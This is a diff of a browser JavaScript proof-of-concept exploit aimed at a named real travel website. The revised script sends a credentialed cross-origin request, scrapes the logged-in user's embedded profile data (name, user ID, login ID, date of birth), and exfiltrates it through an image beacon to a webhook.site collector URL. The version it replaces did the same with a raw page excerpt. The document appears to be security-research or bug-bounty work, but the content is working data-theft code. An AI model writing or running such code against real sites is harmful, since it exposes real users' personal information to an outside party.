@@ -1,27 +1,32 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Preflight-Free CORS PoC</title>
-</head>
-<body>
 <script>
-// Preflight-free attempt (GET request, no headers)
 fetch('https://www.makemytrip.com/gift-cards/corporate-gift-vouchers/', {
-  method: 'GET' // will still work if no preflight is triggered
+  method: 'GET',
+  credentials: 'include'
 })
 .then(r => r.text())
-.then(body => {
-  // Leak via GET (avoids preflight on webhook)
+.then(html => {
+  const userDataMatch = html.match(/window\\.__USER_DATA__=\\[(.*?)\\];/s);
+  if (!userDataMatch) throw "USER_DATA not found";
+
+  const jsonStr = "[" + userDataMatch[1] + "]";
+  const userData = JSON.parse(jsonStr)[0];
+
+  const pii = {
+    email: userData.userDetails.extendedUser.personalDetails.name,
+    uuid: userData.userDetails.extendedUser.uuid,
+    login: userData.userDetails.extendedUser.loginInfoList?.[0]?.loginId,
+    dob: userData.userDetails.extendedUser.personalDetails.dateOfBirth,
+    profileType: userData.profileType
+  };
+
   const img = new Image();
-  img.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=' + encodeURIComponent(body.slice(0, 500));
+  img.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?' + 
+            new URLSearchParams(pii).toString();
   document.body.appendChild(img);
 })
 .catch(err => {
-  const img = new Image();
-  img.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=' + encodeURIComponent(err);
-  document.body.appendChild(img);
+  const errImg = new Image();
+  errImg.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=' + encodeURIComponent(err);
+  document.body.appendChild(errImg);
 });
 </script>
-</body>
-</html>
